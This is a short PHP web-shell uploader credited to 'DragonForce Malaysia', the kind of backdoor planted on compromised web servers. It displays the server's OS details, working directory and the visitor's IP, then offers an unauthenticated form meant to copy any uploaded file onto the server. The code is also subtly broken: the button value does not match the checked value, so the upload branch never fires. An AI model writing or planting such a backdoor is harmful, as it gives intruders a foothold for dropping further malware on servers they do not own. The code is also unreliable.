<title>Supp Bruhh?</title>
<?php
echo "<center>Priv8 Uploaders By DragonForce Malaysia<br><br>Operating System: ".php_uname()."</br>";
echo "Current Directory: ".getcwd()."<br>";
echo "<br>IP Address: ".$_SERVER['REMOTE_ADDR']."<br>";
echo '
<script type="text/javascript" src="http://code.jquery.com/jquery-1.11.3.min.js" ></script>
<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Fuckedz"></form></center>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Fuckedz!<b><br><br>'; }
else { echo '<b>Failed!</b><br><br>'; }
}
?>
